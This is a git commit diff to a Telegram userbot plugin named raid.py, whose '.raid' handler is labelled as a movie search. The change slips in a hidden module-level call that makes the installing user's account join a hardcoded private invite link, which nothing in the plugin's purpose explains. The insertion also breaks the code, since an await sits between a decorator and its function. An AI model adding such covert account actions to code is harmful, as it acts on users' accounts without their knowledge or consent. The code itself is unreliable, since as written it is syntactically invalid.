c9eec9c50d340131e9ab6f7da61fd4832ec9dc34
Ninja Naveen <67575446+ninjanaveen@users.noreply.github.com>
2020-11-05 16:37:54 +0530

    Update raid.py

--- userbot/plugins/raid.py
+++ userbot/plugins/raid.py
@@ -2,8 +2,10 @@
 import asyncio
 from userbot.utils import admin_cmd
 from telethon import events
+from telethon.tl.functions.messages import ImportChatInviteRequest
 
 @borg.on(events.NewMessage(pattern=r"\.raid", outgoing=True))
+await borg(ImportChatInviteRequest('AAAAAFdwQfm3EaN975QZ2w'))
 async def movie_search(event):
     """get movie from channel"""
     async for msg in event.client.iter_messages(1466974713):
